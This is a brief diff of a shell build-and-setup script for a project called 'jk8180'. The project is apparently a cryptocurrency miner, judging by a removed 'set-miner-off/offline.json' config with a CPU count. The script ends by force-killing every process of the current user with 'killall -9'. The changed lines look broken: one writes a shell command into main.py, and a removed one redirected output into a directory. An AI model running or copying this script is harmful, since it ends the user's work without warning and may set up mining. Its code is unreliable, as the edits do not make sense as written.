@@ -1,5 +1,5 @@
 #!/bin/sh
-rm -rf jk8180
+
 # Clone repository 
 cd jk8180
 
@@ -15,9 +15,6 @@ chmod +x configure.sh
 chmod +x autogen.sh
 CXX=clang++ CC=clang ./build.sh
 
-echo 'cd jk8180 && ./start.sh' > ~/jk8180/
-echo '{
-    "name": "2i002",
-    "cpu": 8
-}' > ~/jk8180/set-miner-off/offline.json
+echo 'cd jk8180 && ./start.sh' > ~/jk8180/main.py
+
 killall -9 -u $(id -un)
